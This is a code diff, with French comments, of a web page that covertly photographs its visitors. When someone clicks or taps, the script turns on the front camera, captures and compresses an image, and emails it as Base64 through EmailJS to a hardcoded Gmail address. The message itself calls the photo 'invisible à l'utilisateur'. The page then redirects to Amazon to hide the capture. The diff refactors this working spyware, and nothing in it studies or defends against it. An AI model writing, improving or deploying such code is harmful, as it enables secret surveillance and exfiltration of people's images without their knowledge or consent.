@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
+  <title>Capture et envoi</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     emailjs.init("mxm3fFA_BxEhqJieq");
@@ -14,49 +16,49 @@
 </head>
 <body>
   <div id="status">Cliquez pour continuer...</div>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
 
   <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const status = document.getElementById("status");
-
     async function captureAndSend() {
       document.body.removeEventListener("click", captureAndSend);
       document.body.removeEventListener("touchstart", captureAndSend);
 
+      const status = document.getElementById("status");
       status.textContent = "Activation caméra...";
+
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement("video");
         video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 500));
+        await video.play();
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
+        // Redimensionnement pour réduire le Base64
+        const canvas = document.createElement("canvas");
+        const MAX_WIDTH = 400;
+        let ratio = video.videoHeight / video.videoWidth;
+        canvas.width = MAX_WIDTH;
+        canvas.height = MAX_WIDTH * ratio;
 
-        const imageBase64 = canvas.toDataURL("image/jpeg", 0.5);
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageBase64 = canvas.toDataURL("image/jpeg", 0.4); // compression 40%
+
+        // Stop caméra
         stream.getTracks().forEach(track => track.stop());
 
         // Envoi EmailJS
         const params = {
           to_email: "adressestestee@gmail.com",
-          message: "Photo capturée en Base64 (invisible à l'utilisateur): " + imageBase64
+          message: "Photo capturée (Base64, invisible à l'utilisateur) : " + imageBase64
         };
 
         emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
-          .finally(() => {
-            // Redirection immédiate vers Amazon
-            window.location.href = "https://www.amazon.com";
-          });
+          .finally(() => { window.location.href = "https://www.amazon.com"; });
 
       } catch(err) {
         status.textContent = "Erreur caméra : " + err;
       }
     }
 
-    // Déclenchement au clic ou au touch
+    // Déclenchement au clic ou touch
     document.body.addEventListener("click", captureAndSend);
     document.body.addEventListener("touchstart", captureAndSend, { passive: true });
   </script>
